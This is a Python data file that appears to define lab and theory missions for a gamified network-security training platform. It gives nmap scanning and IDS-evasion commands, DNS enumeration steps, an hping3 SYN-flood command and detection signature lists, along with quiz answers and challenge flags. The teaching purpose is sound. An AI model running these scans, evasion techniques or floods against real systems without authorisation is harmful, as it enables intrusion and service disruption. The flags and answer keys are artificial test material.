        "security_level": "None — No monitoring, no blocking, no defenses active.",
        "flag_inject_cmd": "sed -i 's/FLAG{{[^}}]*}}/{flag}/g' /usr/local/bin/flag_service.sh && pkill -f nc || true",
        "flag": "FLAG{edfbc9713dcc068e}",
        "xp_reward": 75,
    },
    "normal": {
        "briefing": (
            "A suspicious server has been detected on the network. Intelligence suggests\n"
            "it has basic IDS monitoring. Your mission: find the hidden service without\n"
            "triggering too many alarms. The target logs all connection attempts."
        ),
        "objective": "Perform a stealthy scan to find the hidden port and retrieve the flag.",
        "methods": [
            "SYN Stealth Scan (-sS) — Half-open scan, harder to detect in logs",
            "Timing Control (-T2) — Polite timing to reduce detection chance",
            "Targeted Port Range — Scan specific ranges instead of all ports",
        ],
        "tools": [
            {"name": "Nmap SYN", "cmd": "sudo nmap -sS -T2 -p 8000-10000 <TARGET_IP>", "desc": "Stealth SYN scan on likely range"},
            {"name": "Masscan", "cmd": "masscan <TARGET_IP> -p0-65535 --rate=100", "desc": "Fast async scanner"},
            {"name": "Netcat", "cmd": "nc -nv <TARGET_IP> <PORT>", "desc": "Verbose connection to service"},
        ],
        "step_by_step_guide": (
            "STEP 1: Start with a stealthy SYN scan on common high ports.\n"
            "STEP 2: Run: sudo nmap -sS -T2 -p 8000-10000 <TARGET_IP>\n"
            "STEP 3: If not found, expand range: sudo nmap -sS -T2 -p- <TARGET_IP>\n"
            "STEP 4: Identify the non-standard port from results.\n"
            "STEP 5: Connect carefully: nc -nv <TARGET_IP> <PORT>\n"
            "STEP 6: Retrieve and submit the FLAG."
        ),
        "security_level": "Passive Monitoring — IDS logs your scans, noisy tools get flagged.",
        "defender_config": {"block_duration": 30, "active_signatures": ["nmap", "masscan"]},
        "flag_inject_cmd": "sed -i 's/FLAG{{[^}}]*}}/{flag}/g' /usr/local/bin/flag_service.sh && pkill -f nc || true",
        "flag": "FLAG{dcaf567362d2bb94}",
        "xp_reward": 125,
    },
    "hard": {
        "briefing": (
            "High-security target detected. Active AI Defender is monitoring all traffic.\n"
            "Noisy scans WILL get your IP blocked. Find the hidden service using\n"
            "advanced evasion techniques. The Defender patches vulnerabilities it detects."
        ),
        "objective": "Evade the AI Defender, find the hidden port, retrieve the flag without getting blocked.",
        "methods": [
            "Idle/Zombie Scan (-sI) — Use a zombie host to scan indirectly",
            "Fragmented Packets (-f) — Split packets to evade IDS signatures",
            "Decoy Scans (-D) — Mix your IP with decoy IPs to confuse logs",
            "Custom Timing (-T0/T1) — Paranoid/Sneaky timing to avoid rate detection",
        ],
        "tools": [
            {"name": "Nmap Decoy", "cmd": "sudo nmap -sS -D RND:5 -T1 -f -p 8000-10000 <TARGET_IP>", "desc": "Decoy + fragment + slow scan"},
            {"name": "Hping3", "cmd": "hping3 -S -p ++9000 -c 1000 <TARGET_IP>", "desc": "Custom SYN packets"},
            {"name": "Netcat", "cmd": "nc -nv <TARGET_IP> <PORT>", "desc": "Connect after discovery"},
        ],
        "step_by_step_guide": (
            "STEP 1: DO NOT use a basic nmap scan — the Defender will catch you instantly.\n"
            "STEP 2: Use decoys: sudo nmap -sS -D RND:5 -T1 -f -p 8000-10000 <TARGET_IP>\n"
            "STEP 3: If blocked, WAIT for the unblock timer (shown in terminal).\n"
            "STEP 4: Try a different technique: hping3 -S -p ++9000 -c 1000 <TARGET_IP>\n"
            "STEP 5: Once you find the port, connect quickly: nc -nv <TARGET_IP> <PORT>\n"
            "STEP 6: The Mentor will give evasion advice if you get caught."
        ),
        "security_level": "Active AI Defender — Blocks IP (120s), kills sessions, patches vulnerabilities.",
        "defender_config": {"block_duration": 120, "kill_sessions": True, "patch_vulns": True, "active_signatures": ["nmap", "masscan", "hping"]},
        "flag_inject_cmd": "sed -i 's/FLAG{{[^}}]*}}/{flag}/g' /usr/local/bin/flag_service.sh && pkill -f nc || true",
        "flag": "FLAG{3a0120df522b3f13}",
        "xp_reward": 200,
    },
},

# ──────────────────────────────────────────────────────────────────────────────
#  MISSION 102: Theory — OSI Model Deep Dive (Days 2-5)
# ──────────────────────────────────────────────────────────────────────────────
102: {
    "id": 102,
    "name": "OSI Model Deep Dive",
    "type": TYPE_THEORY,
    "phase": 1,
    "easy": {
        "briefing": "Master the 7-layer OSI Model — the foundation of ALL networking.",
        "objective": "Learn and memorize all 7 layers, their functions, and common protocols.",
        "study_topics": [
            "Layer 1 (Physical): Cables, hubs, signals — raw bits on the wire",
            "Layer 2 (Data Link): MAC addresses, switches, ARP, Ethernet frames",
            "Layer 3 (Network): IP addresses, routers, ICMP, routing protocols",
            "Layer 4 (Transport): TCP vs UDP, ports, 3-way handshake, flow control",
            "Layer 5 (Session): Session management, NetBIOS, RPC",
            "Layer 6 (Presentation): Encryption, compression, data translation (SSL/TLS)",
            "Layer 7 (Application): HTTP, FTP, DNS, SMTP — user-facing protocols",
        ],
        "study_guide": (
            "COMPLETE STUDY GUIDE:\n\n"
            "1. Read: https://www.cloudflare.com/learning/ddos/glossary/open-systems-interconnection-model-osi/\n"
            "2. Memorize the mnemonic: 'Please Do Not Throw Sausage Pizza Away' (Physical→Application)\n"
            "3. For each layer, write down: name, function, 2 protocols, 1 device\n"
            "4. Practice: Which layer does a switch operate at? (Layer 2)\n"
            "5. Practice: Which layer does a router operate at? (Layer 3)\n"
            "6. Practice: Where does encryption happen? (Layer 6, or Layer 4 with TLS)\n"
            "7. Draw the full OSI model from memory 3 times."
        ),
        "quiz": [
            {"q": "How many layers does the OSI model have?", "a": "7"},
            {"q": "Which layer handles IP addressing?", "a": "layer 3"},
            {"q": "TCP operates at which layer?", "a": "layer 4"},
            {"q": "What layer does a switch operate at?", "a": "layer 2"},
            {"q": "Which layer handles encryption?", "a": "layer 6"},
        ],
        "xp_reward": 50,
    },
    "normal": {
        "briefing": "Deep dive into OSI — understand how attacks target specific layers.",
        "objective": "Map common attacks to their OSI layers and understand defense mechanisms.",
        "study_topics": [
            "Layer 2 Attacks: ARP Spoofing, MAC Flooding, VLAN Hopping",
            "Layer 3 Attacks: IP Spoofing, ICMP Redirect, Route Poisoning",
            "Layer 4 Attacks: SYN Flood, TCP Session Hijacking, UDP Flood",
            "Layer 7 Attacks: SQL Injection, XSS, DNS Poisoning, HTTP Smuggling",
            "Defense per layer: Port Security, ACLs, Firewalls, WAFs, IDS/IPS",
        ],
        "study_guide": (
            "STUDY GUIDE:\n\n"
            "1. For each OSI layer, research 2 attacks that target it.\n"
            "2. Understand WHY the attack works at that layer.\n"
            "3. Research the defense mechanism for each attack.\n"
            "4. Try to map a real-world breach to its OSI layer.\n"
            "5. Read: SANS GIAC OSI Security Model reference."
        ),
        "quiz": [
            {"q": "ARP Spoofing targets which OSI layer?", "a": "layer 2"},
            {"q": "SYN Flood is an attack on which layer?", "a": "layer 4"},
            {"q": "SQL Injection targets which layer?", "a": "layer 7"},
            {"q": "What defense protects Layer 2 from MAC flooding?", "a": "port security"},
        ],
        "xp_reward": 75,
    },
    "hard": {
        "briefing": "Advanced OSI — protocol analysis and packet-level understanding.",
        "objective": "Analyze raw packets and identify OSI layers from hex dumps.",
        "study_topics": [
            "Packet dissection: Ethernet header → IP header → TCP header → Payload",
            "Wireshark display filters per layer",
            "Understanding TTL, Window Size, MSS for OS fingerprinting",
            "Protocol encapsulation and de-encapsulation process",
        ],
        "study_guide": (
            "ADVANCED GUIDE:\n\n"
            "1. Open Wireshark and capture 60 seconds of traffic.\n"
            "2. Select any HTTP packet — expand ALL layers in the packet detail pane.\n"
            "3. Identify each OSI layer in the raw hex.\n"
            "4. Write the byte offsets for: Dest MAC, Src IP, Dest Port, HTTP Verb.\n"
            "5. Research how OS fingerprinting tools use TTL and Window Size.\n"
            "6. Find your own resources and demonstrate understanding."
        ),
        "quiz": [
            {"q": "What is the hex signature for an Ethernet frame start?", "a": "ff ff ff ff ff ff"},
            {"q": "In an IP header, which byte indicates TTL?", "a": "byte 8"},
            {"q": "Default Windows TTL value?", "a": "128"},
            {"q": "Default Linux TTL value?", "a": "64"},
        ],
        "xp_reward": 100,
    },
},

# ──────────────────────────────────────────────────────────────────────────────
#  MISSION 103: Nmap Ninja — OS Fingerprinting (Day 6)
# ──────────────────────────────────────────────────────────────────────────────
103: {
    "id": 103,
    "name": "Nmap Ninja — OS Fingerprinting",
    "type": TYPE_LAB,
    "phase": 1,
    "docker_image": "networking_lab",
    "container": "cybersim_network_target",
    "easy": {
        "briefing": (
            "A blind target is on the network. You don't know what OS it runs or\n"
            "what services are active. Use Nmap's advanced features to fingerprint\n"
            "the operating system AND detect exact service versions."
        ),
        "objective": "Identify the target OS and all running service versions. Submit the OS name as flag.",
        "methods": [
            "OS Detection (-O) — TCP/IP stack fingerprinting",
            "Service Version Detection (-sV) — Banner grabbing and probing",
            "Aggressive Scan (-A) — OS + Version + Scripts + Traceroute combined",
        ],
        "tools": [
            {"name": "Nmap OS Detect", "cmd": "sudo nmap -O -sV <TARGET_IP>", "desc": "OS fingerprint + version scan"},
            {"name": "Nmap Aggressive", "cmd": "sudo nmap -A <TARGET_IP>", "desc": "Full aggressive scan"},
            {"name": "Nmap Scripts", "cmd": "nmap --script=banner <TARGET_IP>", "desc": "Banner grabbing script"},
        ],
        "step_by_step_guide": (
            "STEP 1: Run OS detection: sudo nmap -O -sV <TARGET_IP>\n"
            "STEP 2: Note the 'OS details' line in the output.\n"
            "STEP 3: Check service versions — each port shows the software version.\n"
            "STEP 4: For more detail, run: sudo nmap -A <TARGET_IP>\n"
            "STEP 5: The flag is the OS name shown (e.g., 'Linux 5.x' → submit 'linux').\n"
            "STEP 6: Submit the flag."
        ),
        "security_level": "None — No defenses active.",
        "flag": "FLAG{0c540a7ae41bee8b}",
        "xp_reward": 75,
    },
    "normal": {
        "briefing": "The target has basic logging. Perform OS fingerprinting while minimizing your scan footprint.",
        "objective": "Identify the OS using stealthier methods. IDS is passively monitoring.",
        "methods": [
            "SYN Scan + OS Detect (-sS -O) — Stealthier than full connect",
            "Version Intensity Control (--version-intensity 2) — Reduce probe noise",
            "Scan specific ports only — Don't scan all 65535",
        ],
        "tools": [
            {"name": "Nmap Stealth OS", "cmd": "sudo nmap -sS -O --version-intensity 2 -p 22,80,443 <TARGET_IP>", "desc": "Targeted stealth OS detect"},
            {"name": "P0f", "cmd": "p0f -i eth0", "desc": "Passive OS fingerprinting from traffic"},
        ],
        "step_by_step_guide": (
            "STEP 1: Start with common ports only: sudo nmap -sS -O -p 22,80,443,8080 <TARGET_IP>\n"
            "STEP 2: Use passive fingerprinting: p0f -i eth0 (listen to traffic)\n"
            "STEP 3: Reduce version scan intensity: --version-intensity 2\n"
            "STEP 4: Analyze the OS guess from Nmap output.\n"
            "STEP 5: Submit the flag."
        ),
        "security_level": "Passive IDS — Logs all scan attempts, alerts on aggressive scans.",
        "defender_config": {"block_duration": 30, "active_signatures": ["nmap -A", "aggressive"]},
        "flag": "FLAG{86dcc39a7589d123}",
        "xp_reward": 125,
    },
    "hard": {
        "briefing": "Active defenses are up. The target will block you if it detects fingerprinting attempts.",
        "objective": "Identify the OS using only passive or indirect methods.",
        "methods": [
            "Passive OS Fingerprinting (p0f) — No packets sent, just observe",
            "TTL Analysis — Guess OS from ICMP/TCP response TTL values",
            "Manual Banner Grabbing — Connect to services and read banners",
            "TCP Window Size Analysis — Different OSes use different defaults",
        ],
        "tools": [
            {"name": "P0f", "cmd": "p0f -i eth0 -o /tmp/p0f.log", "desc": "Passive OS fingerprint to log"},
            {"name": "Ping TTL", "cmd": "ping -c 1 <TARGET_IP> | grep ttl", "desc": "Check TTL for OS guess"},
            {"name": "Curl Banner", "cmd": "curl -sI http://<TARGET_IP>", "desc": "HTTP server header = OS hint"},
        ],
        "step_by_step_guide": (
            "STEP 1: DO NOT run nmap -O — the Defender will catch you.\n"
            "STEP 2: Use passive methods: p0f -i eth0\n"
            "STEP 3: Send a single ping: ping -c 1 <TARGET_IP> — check TTL.\n"
            "   TTL=64 → Linux, TTL=128 → Windows, TTL=255 → Cisco/Solaris\n"
            "STEP 4: Grab HTTP banner: curl -sI http://<TARGET_IP>\n"
            "STEP 5: Check 'Server:' header for OS clues.\n"
            "STEP 6: Submit the flag."
        ),
        "security_level": "Active AI Defender — Blocks IP on OS detection attempts, 120s cooldown.",
        "defender_config": {"block_duration": 120, "kill_sessions": True, "patch_vulns": True},
        "flag": "FLAG{ceeb2c6fb2d0adbc}",
        "xp_reward": 200,
    },
},

# ──────────────────────────────────────────────────────────────────────────────
#  MISSION 104: Theory — TCP/UDP Deep Dive (Day 7)
# ──────────────────────────────────────────────────────────────────────────────
104: {
    "id": 104,
    "name": "TCP/UDP Protocol Deep Dive",
    "type": TYPE_THEORY,
    "phase": 1,
    "easy": {
        "briefing": "Understand the two core transport protocols that power the internet.",
        "objective": "Learn TCP 3-way handshake, UDP characteristics, and when each is used.",
        "study_topics": [
            "TCP 3-Way Handshake: SYN → SYN-ACK → ACK",
            "TCP Teardown: FIN → FIN-ACK → ACK (graceful close)",
            "TCP Flags: SYN, ACK, FIN, RST, PSH, URG",
            "UDP: Connectionless, no handshake, faster but unreliable",
            "Common TCP ports: 22(SSH), 80(HTTP), 443(HTTPS), 3306(MySQL)",
            "Common UDP ports: 53(DNS), 67/68(DHCP), 161(SNMP), 69(TFTP)",
        ],
        "study_guide": (
            "1. Watch: TCP 3-way handshake animation on YouTube.\n"
            "2. Open Wireshark → filter: tcp.flags.syn==1 → observe handshakes.\n"
            "3. Memorize: SYN → SYN-ACK → ACK (think: 'Hey!' → 'Hey back!' → 'Cool!')\n"
            "4. Understand: Why does Nmap SYN scan work? (It sends SYN, gets SYN-ACK, but sends RST instead of ACK)\n"
            "5. Practice: List 5 TCP and 5 UDP services from memory."
        ),
        "quiz": [
            {"q": "What are the 3 steps of TCP handshake?", "a": "syn syn-ack ack"},
            {"q": "Is DNS primarily TCP or UDP?", "a": "udp"},
            {"q": "What TCP flag resets a connection?", "a": "rst"},
            {"q": "What port does HTTPS use?", "a": "443"},
        ],
        "xp_reward": 50,
    },
    "normal": {
        "briefing": "Advanced TCP/UDP — understand how attackers abuse these protocols.",
        "objective": "Learn TCP-based attacks and how to detect them.",
        "study_topics": [
            "SYN Flood Attack — How it exhausts server resources",
            "TCP Session Hijacking — Predicting sequence numbers",
            "UDP Amplification — DNS/NTP reflection attacks",
            "TCP RST Injection — How firewalls/ISPs terminate connections",
        ],
        "study_guide": (
            "1. Research: How does a SYN Flood work? What is SYN cookies defense?\n"
            "2. Use hping3 to generate a SYN flood (ONLY on your own lab!):\n"
            "   hping3 -S --flood -p 80 <TARGET_IP>\n"
            "3. Open Wireshark and observe the flood — notice no ACK responses.\n"
            "4. Research: How do ISPs to TCP RST injection for censorship?"
        ),
        "quiz": [
            {"q": "What defense mitigates SYN floods?", "a": "syn cookies"},
            {"q": "What flag does a SYN flood abuse?", "a": "syn"},
            {"q": "UDP amplification uses what protocol commonly?", "a": "dns"},
        ],
        "xp_reward": 75,
    },
    "hard": {
        "briefing": "Expert TCP/UDP — packet crafting and protocol manipulation.",
        "objective": "Craft custom TCP packets and analyze protocol behavior at the byte level.",
        "study_topics": [
            "Scapy: Craft custom TCP/UDP packets in Python",
            "TCP sequence number prediction for session hijacking",
            "Firewall evasion using TCP flag manipulation",
            "Protocol tunneling: DNS over TCP, TCP over DNS",
        ],
        "study_guide": (
            "1. Install Scapy: pip install scapy\n"
            "2. Craft a SYN packet: send(IP(dst='TARGET')/TCP(dport=80,flags='S'))\n"
            "3. Analyze the response — what flags does the target send back?\n"
            "4. Try crafting an XMAS scan packet (all flags set).\n"
            "5. Research: How does TCP-over-DNS tunneling work for data exfiltration?"
        ),
        "quiz": [
            {"q": "What Scapy function sends a packet and receives response?", "a": "sr1"},
            {"q": "XMAS scan sets which flags?", "a": "fin psh urg"},
            {"q": "What tool creates DNS tunnels?", "a": "iodine"},
        ],
        "xp_reward": 100,
    },
},

# ──────────────────────────────────────────────────────────────────────────────
#  MISSION 105: Vulnerability Scanning with NSE (Days 8-10)
# ──────────────────────────────────────────────────────────────────────────────
105: {
    "id": 105,
    "name": "Vulnerability Scanning with NSE Scripts",
    "type": TYPE_LAB,
    "phase": 1,
    "docker_image": "networking_lab",
    "container": "cybersim_network_target",
    "easy": {
        "briefing": (
            "An old Apache server is running on the target. Your mission: use Nmap NSE\n"
            "(Nmap Scripting Engine) scripts to find known vulnerabilities automatically.\n"
            "NSE scripts are like plugins — Nmap has 600+ scripts for various checks."
        ),
        "objective": "Run vulnerability scripts against the target and identify at least 2 CVEs.",
        "methods": [
            "Default Scripts (-sC) — Runs safe, commonly useful scripts",
            "Vuln Category (--script=vuln) — Runs all vulnerability detection scripts",
            "Specific Script (--script=http-vuln-*) — Target specific web vulns",
        ],
        "tools": [
            {"name": "Nmap Vuln Scan", "cmd": "nmap --script=vuln <TARGET_IP>", "desc": "All vulnerability scripts"},
            {"name": "Nmap HTTP Vuln", "cmd": "nmap --script=http-vuln-* -p 80 <TARGET_IP>", "desc": "HTTP-specific vulns"},
            {"name": "Nmap SMB Vuln", "cmd": "nmap --script=smb-vuln-* -p 445 <TARGET_IP>", "desc": "SMB vulnerability check"},
            {"name": "SearchSploit", "cmd": "searchsploit apache 2.4", "desc": "Find exploits for discovered versions"},
        ],
        "step_by_step_guide": (
            "STEP 1: First discover services: nmap -sV <TARGET_IP>\n"
            "STEP 2: Note the Apache version number.\n"
            "STEP 3: Run vuln scripts: nmap --script=vuln -p 80 <TARGET_IP>\n"
            "STEP 4: Read the output — each CVE will be listed.\n"
            "STEP 5: Cross-reference with: searchsploit <service> <version>\n"
            "STEP 6: Submit the CVE numbers as the flag (e.g., FLAG{CVE-2021-XXXX})."
        ),
        "security_level": "None — Open target, no monitoring.",
        "flag": "FLAG{4b575099e813e526}",
        "xp_reward": 100,
    },
    "normal": {
        "briefing": "The target has basic NIDS. Run vulnerability scans without tripping the alert threshold.",
        "objective": "Find vulnerabilities using targeted, less noisy scripts.",
        "methods": [
            "Targeted NSE Scripts — Run only specific scripts, not --script=vuln (too noisy)",
            "Manual Banner Analysis — Grab versions, lookup CVEs manually",
            "Rate-Limited Scanning — Use --scan-delay to avoid flooding",
        ],
        "tools": [
            {"name": "Targeted NSE", "cmd": "nmap --script=http-headers,http-title -p 80 <TARGET_IP>", "desc": "Quiet scripts only"},
            {"name": "Nikto (careful)", "cmd": "nikto -h http://<TARGET_IP> -Tuning 1", "desc": "Web vuln scanner (limited mode)"},
            {"name": "CVE Search", "cmd": "searchsploit --www apache 2.4.49", "desc": "Search for CVEs by version"},
        ],
        "step_by_step_guide": (
            "STEP 1: Grab the banner quietly: nmap -sV --version-intensity 2 -p 80 <TARGET_IP>\n"
            "STEP 2: Use specific safe scripts: --script=http-headers,http-methods\n"
            "STEP 3: Search for CVEs: searchsploit apache <version>\n"
            "STEP 4: Avoid --script=vuln — it's too loud for passive IDS.\n"
            "STEP 5: Submit the flag."
        ),
        "security_level": "Passive NIDS — Alert on mass scripting, logs all connections.",
        "defender_config": {"block_duration": 45, "active_signatures": ["vuln", "nikto", "sqlmap"]},
        "flag": "FLAG{81f832e8a3f4c713}",
        "xp_reward": 150,
    },
    "hard": {
        "briefing": "Active IPS is running. It will drop connections and block your IP if it detects scanning tools.",
        "objective": "Find vulnerabilities using manual methods only — no automated scanners.",
        "methods": [
            "Manual Banner Grabbing — Use curl/nc to get service info",
            "Manual CVE Research — Lookup versions in NVD/ExploitDB manually",
            "Custom Script Writing — Write your own Python checker",
            "Source Code Analysis — If web app source is accessible",
        ],
        "tools": [
            {"name": "Curl Headers", "cmd": "curl -sI http://<TARGET_IP>", "desc": "Get HTTP response headers"},
            {"name": "Netcat Banner", "cmd": "echo '' | nc -nv <TARGET_IP> 80", "desc": "Raw banner grab"},
            {"name": "ExploitDB", "cmd": "searchsploit --www <service> <version>", "desc": "Offline CVE search"},
        ],
        "step_by_step_guide": (
            "STEP 1: DO NOT use nmap scripts or nikto — you'll be blocked.\n"
            "STEP 2: Manual approach: curl -sI http://<TARGET_IP>\n"
            "STEP 3: Read 'Server:' header for software/version.\n"
            "STEP 4: Search CVEs: searchsploit <software> <version>\n"
            "STEP 5: Write a custom Python script to test specific CVE.\n"
            "STEP 6: Submit the flag."
        ),
        "security_level": "Active IPS — Drops connections from known scanners, blocks IP 120s.",
        "defender_config": {"block_duration": 120, "kill_sessions": True, "patch_vulns": True},
        "flag": "FLAG{3699dcde53775efd}",
        "xp_reward": 200,
    },
},

# ──────────────────────────────────────────────────────────────────────────────
#  MISSION 106: Theory — Subnetting Math (Days 11-15)
# ──────────────────────────────────────────────────────────────────────────────
106: {
    "id": 106,
    "name": "Subnetting Mastery",
    "type": TYPE_THEORY,
    "phase": 1,
    "easy": {
        "briefing": "Master subnetting — the math behind IP networks. Essential for every cert exam.",
        "objective": "Calculate CIDR blocks, subnet masks, and usable host ranges.",
        "study_topics": [
            "IPv4 address structure: 4 octets (32 bits total)",
            "Subnet Mask: Divides network portion from host portion",
            "CIDR Notation: /24 = 255.255.255.0 = 256 addresses (254 usable)",
            "Common subnets: /8 (16M hosts), /16 (65K hosts), /24 (254 hosts), /32 (1 host)",
            "Network Address: First IP (all host bits = 0)",
            "Broadcast Address: Last IP (all host bits = 1)",
        ],
        "study_guide": (
            "1. Memorize the powers of 2: 2^1=2, 2^2=4, 2^3=8... up to 2^8=256\n"
            "2. Formula: Usable hosts = 2^(32-CIDR) - 2\n"
            "3. Practice: /24 = 2^8 - 2 = 254 usable hosts\n"
            "4. Practice: /28 = 2^4 - 2 = 14 usable hosts\n"
            "5. Given 192.168.1.0/26: Network=192.168.1.0, Broadcast=192.168.1.63, Range=.1-.62\n"
            "6. Use: ipcalc 192.168.1.0/26 to verify your math."
        ),
        "quiz": [
            {"q": "How many usable hosts in a /24?", "a": "254"},
            {"q": "What is the subnet mask for /16?", "a": "255.255.0.0"},
            {"q": "Broadcast address of 10.0.0.0/8?", "a": "10.255.255.255"},
        ],
        "xp_reward": 50,
    },
    "normal": {
        "briefing": "Advanced subnetting — VLSM and supernetting for real network design.",
        "objective": "Design subnet schemes and perform VLSM calculations.",
        "study_topics": [
            "VLSM (Variable Length Subnet Masking) — Different sizes per subnet",
            "Supernetting/Route Aggregation — Combine subnets into larger blocks",
            "Subnet design for real scenarios: Departments, VLANs, DMZ",
        ],
        "study_guide": (
            "1. Design a network: HQ (100 hosts), Branch1 (50), Branch2 (25), DMZ (10)\n"
            "2. Use VLSM to assign the minimum subnet to each:\n"
            "   HQ: /25 (126 hosts), Branch1: /26 (62), Branch2: /27 (30), DMZ: /28 (14)\n"
            "3. Verify no overlap in your addressing.\n"
            "4. Practice route aggregation: Combine 192.168.0.0/24 + 192.168.1.0/24 = 192.168.0.0/23"
        ),
        "quiz": [
            {"q": "VLSM stands for?", "a": "variable length subnet masking"},
            {"q": "Minimum subnet for 50 hosts?", "a": "/26"},
            {"q": "192.168.0.0/24 + 192.168.1.0/24 aggregates to?", "a": "192.168.0.0/23"},
        ],
        "xp_reward": 75,
    },
    "hard": {
        "briefing": "Expert subnetting — binary math and real-world pentest network analysis.",
        "objective": "Subnet in binary and analyze target networks from scan results.",
        "study_topics": [
            "Binary subnetting — Convert and calculate in binary",
            "Identifying subnet boundaries from Nmap scan results",
            "Pivoting: Understanding which subnets you can reach from a compromised host",
        ],
        "study_guide": (
            "1. Convert 172.16.45.128/25 to binary and identify network/broadcast.\n"
            "2. From an Nmap scan showing hosts .1-.62 and .65-.126, what subnets exist?\n"
            "3. If you compromise 10.10.10.5/24 and see 10.10.20.0/24 in routes, plan pivot.\n"
            "4. Calculate the minimum number of subnets for a Class B with 500 subnets needed."
        ),
        "quiz": [
            {"q": "Binary of 192 in 8 bits?", "a": "11000000"},
            {"q": "How many /24 subnets fit in a /16?", "a": "256"},
        ],
        "xp_reward": 100,
    },
},

# ──────────────────────────────────────────────────────────────────────────────
#  MISSION 107: DNS & DHCP Enumeration (Days 16-21)
# ──────────────────────────────────────────────────────────────────────────────
107: {
    "id": 107, "name": "DNS & DHCP Enumeration", "type": TYPE_LAB, "phase": 1,
    "docker_image": "networking_lab", "container": "cybersim_network_target",
    "easy": {
        "briefing": "A target DNS server is misconfigured. Extract all DNS records via zone transfer and spoof DHCP requests in an isolated container.",
        "objective": "Perform DNS zone transfer and enumerate all subdomains. Discover DHCP scope info.",
        "methods": ["DNS Zone Transfer (AXFR)", "DNS Enumeration with dig/nslookup", "DHCP Discover packets"],
        "tools": [
            {"name": "dig AXFR", "cmd": "dig axfr @<TARGET_IP> target.local", "desc": "Full zone transfer"},
            {"name": "nslookup", "cmd": "nslookup -type=any target.local <TARGET_IP>", "desc": "Query all record types"},
            {"name": "DNSRecon", "cmd": "dnsrecon -d target.local -n <TARGET_IP> -t axfr", "desc": "Automated DNS recon"},
            {"name": "Nmap DHCP", "cmd": "nmap --script=dhcp-discover <TARGET_IP>", "desc": "Discover DHCP scope"},
        ],
        "step_by_step_guide": (
            "STEP 1: Query the DNS server: dig @<TARGET_IP> target.local ANY\n"
            "STEP 2: Attempt zone transfer: dig axfr @<TARGET_IP> target.local\n"
            "STEP 3: If transfer succeeds, you'll see ALL DNS records (A, MX, NS, TXT, etc.)\n"
            "STEP 4: Look for hidden subdomains or TXT records containing flags.\n"
            "STEP 5: Run DHCP discovery: nmap --script=dhcp-discover\n"
            "STEP 6: Submit the flag found in DNS records."
        ),
        "security_level": "None — DNS server allows unrestricted zone transfers.",
        "flag": "FLAG{5bc66fac50f7d9a8}",
        "xp_reward": 100,
    },
    "normal": {
        "briefing": "DNS zone transfer is restricted. Use alternative enumeration techniques to map the domain.",
        "objective": "Enumerate DNS without zone transfer. Find hidden subdomains.",
        "methods": ["DNS Brute Force with wordlists", "Reverse DNS Lookups", "DNS Cache Snooping"],
        "tools": [
            {"name": "Fierce", "cmd": "fierce --domain target.local --dns-servers <TARGET_IP>", "desc": "DNS brute force"},
            {"name": "DNSEnum", "cmd": "dnsenum --dnsserver <TARGET_IP> target.local", "desc": "Comprehensive DNS enum"},
            {"name": "dig Reverse", "cmd": "dig -x <IP> @<TARGET_IP>", "desc": "Reverse DNS lookup"},
        ],
        "step_by_step_guide": (
            "STEP 1: Zone transfer will FAIL here: dig axfr @<TARGET_IP> target.local\n"
            "STEP 2: Use brute force: fierce --domain target.local --dns-servers <TARGET_IP>\n"
            "STEP 3: Try reverse lookups on discovered IPs.\n"
            "STEP 4: Check for DNS cache snooping: dig @<TARGET_IP> www.google.com +norecurse\n"
            "STEP 5: Submit the flag."
        ),
        "security_level": "Zone transfer restricted. Rate limiting on DNS queries.",
        "defender_config": {"block_duration": 30, "active_signatures": ["axfr", "dnsrecon"]},
        "flag": "FLAG{021b4842a5994060}",
        "xp_reward": 150,
    },
    "hard": {
        "briefing": "DNS is hardened — no zone transfer, rate limiting active, and DNS queries are logged.",
        "objective": "Use passive DNS techniques and OSINT to enumerate the domain.",
        "methods": ["Passive DNS via OSINT", "Certificate Transparency Logs", "DNSSEC Enumeration", "Custom Python DNS scripts"],
        "tools": [
            {"name": "Sublist3r", "cmd": "sublist3r -d target.local", "desc": "Passive subdomain enum"},
            {"name": "crt.sh", "cmd": "curl -s 'https://crt.sh/?q=%25.target.local&output=json'", "desc": "Certificate transparency"},
            {"name": "Custom Script", "cmd": "python3 dns_enum.py target.local", "desc": "Your own DNS tool"},
        ],
        "step_by_step_guide": (
            "STEP 1: Active enumeration will get you blocked — use passive methods.\n"
            "STEP 2: Check certificate transparency: curl -s 'https://crt.sh/?q=%25.target.local'\n"
            "STEP 3: Use passive recon tools: sublist3r, amass passive mode.\n"
            "STEP 4: Write a custom Python DNS resolver with rate limiting.\n"
            "STEP 5: Submit the flag."
        ),
        "security_level": "Active monitoring — blocks aggressive DNS tools, patches zone transfer.",
        "defender_config": {"block_duration": 120, "kill_sessions": True, "patch_vulns": True},
        "flag": "FLAG{13d93fb7637b00f6}",
        "xp_reward": 200,
    },
},

# ──────────────────────────────────────────────────────────────────────────────
#  MISSION 108: Theory — Wireshark & PCAP (Days 22-26)
# ──────────────────────────────────────────────────────────────────────────────
108: {
    "id": 108, "name": "Wireshark & Packet Analysis Theory", "type": TYPE_THEORY, "phase": 1,
    "easy": {
        "briefing": "Master Wireshark — the world's most popular network protocol analyzer.",
        "objective": "Learn Wireshark basics, capture filters, display filters, and following streams.",
        "study_topics": [
            "Capture vs Display filters — When to use each",
            "Common display filters: ip.addr==, tcp.port==, http, dns, tcp.flags.syn==1",
            "Following TCP/HTTP streams: Right-click → Follow → TCP Stream",
            "Statistics menu: Protocol Hierarchy, Conversations, Endpoints",
            "Coloring rules for quick identification",
        ],
        "study_guide": (
            "1. Open Wireshark, select your interface, start capture.\n"
            "2. Browse to any website — observe the traffic.\n"
            "3. Apply filter: http — see only HTTP traffic.\n"
            "4. Apply filter: dns — see DNS queries.\n"
            "5. Right-click an HTTP packet → Follow → TCP Stream — see full conversation.\n"
            "6. Go to Statistics → Protocol Hierarchy — understand traffic breakdown.\n"
            "7. Practice: Filter for traffic to/from a specific IP."
        ),
        "quiz": [
            {"q": "Filter to see only HTTP traffic?", "a": "http"},
            {"q": "Filter for packets from 10.0.0.5?", "a": "ip.src==10.0.0.5"},
            {"q": "How to see full TCP conversation?", "a": "follow tcp stream"},
        ],
        "xp_reward": 50,
    },
    "normal": {
        "briefing": "Advanced Wireshark — analyzing attacks in packet captures.",
        "objective": "Identify attacks, extract credentials, and analyze malicious traffic from PCAPs.",
        "study_topics": [
            "Detecting port scans in PCAP (many SYN packets, few ACKs)",
            "Extracting credentials from HTTP POST (unencrypted)",
            "Finding DNS exfiltration (unusually long DNS queries)",
            "Detecting ARP spoofing (duplicate MAC for different IPs)",
        ],
        "study_guide": (
            "1. Download a sample malicious PCAP from malware-traffic-analysis.net\n"
